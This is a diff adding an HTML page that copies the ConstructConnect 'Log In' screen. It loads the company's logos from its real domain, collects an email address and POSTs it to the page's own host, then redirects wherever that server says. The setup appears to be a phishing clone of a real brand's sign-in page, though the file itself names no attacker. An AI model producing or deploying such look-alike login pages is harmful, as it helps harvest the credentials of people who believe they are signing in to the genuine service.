@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ConstructConnect Log In</title>
+    <link rel="icon" href="https://login.io.constructconnect.com/favicon.ico">
+    <style>
+        :root {
+            --navy-header: #10293f;
+            --navy-dark: #17324e;
+            --blue-mid: #2f7fb5;
+            --blue-light: #3a8fc4;
+            --page-bg: #f2f2f1;
+            --card-border: #cdd9e5;
+            --input-border: #a9a9a9;
+            --btn-disabled: #bcd4e6;
+            --btn-active: #2f7fb5;
+            --asterisk: #d0021b;
+            --label: #222;
+            --placeholder: #8a8a8a;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        body {
+            background: var(--page-bg);
+            font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+            color: var(--navy-dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* ---------- Header ---------- */
+        header {
+            background: #01304a;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            padding: 0 28px;
+            flex-shrink: 0;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-logo img {
+            height: 20px;
+            width: auto;
+            display: block;
+        }
+
+        /* ---------- Main / card ---------- */
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            width: 350px;
+            max-width: 100%;
+            border: 1px solid #0c79a8;
+            border-radius: 10px;
+            padding: 26px 20px;
+        }
+
+        /* card logo */
+        .card-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        .card-logo img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* form */
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--label);
+            margin-bottom: 8px;
+        }
+
+        label .req {
+            color: var(--asterisk);
+            margin-left: 2px;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 11px 12px;
+            font-size: 15px;
+            color: var(--navy-dark);
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            outline: none;
+            transition: border-color .15s ease, box-shadow .15s ease;
+        }
+
+        input[type="email"]::placeholder {
+            color: var(--placeholder);
+            font-style: italic;
+        }
+
+        input[type="email"]:focus {
+            border-color: var(--blue-mid);
+            box-shadow: 0 0 0 2px rgba(47, 127, 181, .18);
+        }
+
+        .login-btn {
+            margin-top: 26px;
+            width: 100%;
+            padding: 13px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #ffffff;
+            background: var(--btn-disabled);
+            border: none;
+            border-radius: 4px;
+            cursor: not-allowed;
+            transition: background .15s ease;
+        }
+
+        .login-btn.enabled {
+            background: var(--btn-active);
+            cursor: pointer;
+        }
+
+        .login-btn.enabled:hover {
+            background: #276c9c;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="header-logo">
+            <img src="https://login.io.constructconnect.com/_next/static/media/logo-white-full.acb42fe9.svg" alt="ConstructConnect">
+        </div>
+    </header>
+
+    <main>
+        <div class="card">
+            <div class="card-logo">
+                <img src="https://login.io.constructconnect.com/_next/static/media/logo-color-tagline.4494dee1.svg" alt="ConstructConnect — Construction Starts Here">
+            </div>
+
+            <form id="loginForm" novalidate>
+                <label for="email">Email <span class="req">*</span></label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" autocomplete="email">
+                <button type="submit" id="loginBtn" class="login-btn" disabled>Continue</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        const email = document.getElementById('email');
+        const btn = document.getElementById('loginBtn');
+        const form = document.getElementById('loginForm');
+        const valid = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
+
+        email.addEventListener('input', () => {
+            const ok = valid(email.value);
+            btn.disabled = !ok;
+            btn.classList.toggle('enabled', ok);
+        });
+
+        form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (!valid(email.value)) return;
+
+    btn.textContent = 'Logging in…';
+    btn.disabled = true;
+
+    try {
+        const body = new URLSearchParams({ email: email.value.trim() });
+        const res = await fetch(window.location.href, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body
+        });
+        const data = await res.json();
+
+        if (data.success && data.redirect_url) {
+            window.location.href = data.redirect_url;
+        } else {
+            btn.textContent = 'Continue';
+            btn.disabled = false;
+            // show data.error somewhere
+            alert(data.error || 'Something went wrong.');
+        }
+    } catch (err) {
+        btn.textContent = 'Continue';
+        btn.disabled = false;
+        alert('Network error.');
+    }
+});
+    </script>
+
+</body>
+
+</html>
